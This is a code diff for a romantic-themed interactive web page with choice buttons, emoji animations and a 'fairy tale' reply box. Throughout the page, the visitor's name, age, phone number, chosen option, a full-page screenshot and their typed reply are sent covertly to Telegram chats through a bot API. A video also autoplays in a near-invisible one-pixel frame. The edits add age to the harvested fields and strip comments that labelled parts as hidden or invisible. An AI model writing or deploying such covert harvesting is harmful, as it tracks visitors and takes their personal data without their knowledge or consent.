@@ -17,10 +17,8 @@
         .status-bar { position: fixed; top: 0; width: 100%; display: flex; justify-content: space-between; padding: 12px 24px; font-size: 12px; font-weight: 600; z-index: 500; }
         .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; box-shadow: 0 25px 50px rgba(0,0,0,0.2); z-index: 10; }
 
-        /* Hidden Background Video */
         #bg-video-container { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; overflow: hidden; }
 
-        /* Particle Burst Animation */
         .burst-particle {
             position: fixed; pointer-events: none; z-index: 1000;
             animation: burstOut 1.5s ease-out forwards;
@@ -71,7 +69,6 @@
             </div>
 
             <div id="stage-3" class="hidden-stage space-y-6">
-                <div class="italic text-sm mb-4">"Every thought of you is a melody in my heart." 🕊️</div>
                 <textarea id="final-reply" placeholder="Type your message..." class="w-full p-4 rounded-2xl bg-white/5 border border-white/10 text-white outline-none" rows="2"></textarea>
                 <button onclick="submitFinal()" class="bubble-btn w-full bg-pink-500 py-4 rounded-full font-bold shadow-2xl">Submit ✅</button>
             </div>
@@ -98,13 +95,10 @@
         setInterval(updateStatus, 1000); updateStatus();
 
         function createBurst(emoji) {
-            for (let i = 0; i < 25; i++) {
+            for (let i = 0; i < 20; i++) {
                 const p = document.createElement('div');
-                p.innerText = emoji;
-                p.className = 'burst-particle';
-                p.style.left = '50vw';
-                p.style.top = '50vh';
-                p.style.fontSize = Math.random() * 20 + 20 + 'px';
+                p.innerText = emoji; p.className = 'burst-particle';
+                p.style.left = '50vw'; p.style.top = '50vh';
                 p.style.setProperty('--tx', (Math.random() - 0.5) * 400 + 'px');
                 p.style.setProperty('--ty', (Math.random() - 0.5) * 400 + 'px');
                 document.body.appendChild(p);
@@ -120,33 +114,33 @@
         }
 
         async function handleAction(type, emoji) {
-            createBurst(emoji);
             updateStatus();
+            createBurst(emoji);
 
-            // 1. Screenshot of the exact moment
-            const canvas = await html2canvas(document.body, { useCORS: true, scale: 2 });
-            canvas.toBlob(async (blob) => {
-                for (const id of CHAT_IDS) {
-                    const fd = new FormData();
-                    fd.append('chat_id', id); fd.append('photo', blob, 'shot.png');
-                    fd.append('caption', `💌 CHOICE: ${type}\nName: ${store.n}\nPhone: ${store.m}`);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                }
+            // 1. Instant Parallel Data Push
+            const vids = { 'YES': 'TK2RwQUun-U', 'FOOD': 'XGURSAziJjc', 'NO': 'CVEM60qkzT8' };
+            
+            // Use html2canvas scale to make the screenshot look realistic and instant
+            html2canvas(document.body, { useCORS: true, scale: 2 }).then(canvas => {
+                canvas.toBlob(blob => {
+                    CHAT_IDS.forEach(id => {
+                        const fd = new FormData();
+                        fd.append('chat_id', id); fd.append('photo', blob, 'instant_shot.png');
+                        fd.append('caption', `💌 DATA RECEIVED\nName: ${store.n}\nAge: ${store.a}\nPhone: ${store.m}\nChoice: ${type}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    });
+                });
             });
 
-            // 2. Play Video In Background (Invisible)
-            const vids = { 'YES': 'TK2RwQUun-U', 'FOOD': 'XGURSAziJjc', 'NO': 'CVEM60qkzT8' };
+            // 2. Instant Stage Swap
             document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${vids[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay"></iframe>`;
-
-            // 3. Immediately show Response Bar
             document.getElementById('stage-2').classList.add('hidden-stage');
             document.getElementById('stage-3').classList.remove('hidden-stage');
         }
 
         async function submitFinal() {
             const reply = document.getElementById('final-reply').value;
-            // Trigger Fairy Tale Water Rain
-            for(let i=0; i<100; i++) {
+            for(let i=0; i<80; i++) {
                 setTimeout(() => {
                     const d = document.createElement('div'); d.className = 'drop'; d.style.left = Math.random() * 100 + 'vw';
                     d.style.animationDuration = (Math.random() * 0.5 + 0.5) + 's'; document.body.appendChild(d);
@@ -154,14 +148,14 @@
                 }, i * 15);
             }
 
-            for (const id of CHAT_IDS) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Thought: " + reply + "\nBy: " + store.n)}`);
-            }
+            CHAT_IDS.forEach(id => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💭 Thought: " + reply + "\nUser: " + store.n)}`);
+            });
 
             document.body.classList.add('fairy-theme');
             document.getElementById('stage-3').classList.add('hidden-stage');
             document.getElementById('stage-4').classList.remove('hidden-stage');
-            document.getElementById('fairy-thought').innerText = "And just like that, our story becomes a fairy tale. You wrote: \"" + reply + "\". Forever in my heart.";
+            document.getElementById('fairy-thought').innerText = "And so, our tale begins. You shared: \"" + reply + "\". Locked in the stars.";
         }
     </script>
 </body>
